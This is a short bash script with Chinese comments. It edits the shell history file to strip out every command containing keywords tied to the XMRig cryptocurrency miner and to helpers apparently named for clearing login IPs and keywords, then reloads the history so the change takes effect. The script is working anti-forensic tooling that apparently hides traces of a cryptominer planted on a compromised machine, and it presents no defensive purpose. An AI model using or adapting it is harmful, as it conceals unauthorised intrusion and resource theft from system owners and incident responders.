#!/bin/bash
# 删除 history 中包含敏感关键词的命令

HISTFILE=${HISTFILE:-$HOME/.bash_history}
BACKUP_FILE="$HISTFILE.bak"

# 写入最新记录
history -w



# 关键字，可根据需要修改
KEYWORDS="xmrig|phpsw|xmrig_service|clear_login_ip|clen_keywords"

# 删除包含关键词的命令
grep -v -E "$KEYWORDS" "$HISTFILE" > "${HISTFILE}.new"
mv "${HISTFILE}.new" "$HISTFILE"

# 清空内存并重新加载
history -c
history -r

echo "已删除包含 [$KEYWORDS] 的命令。"
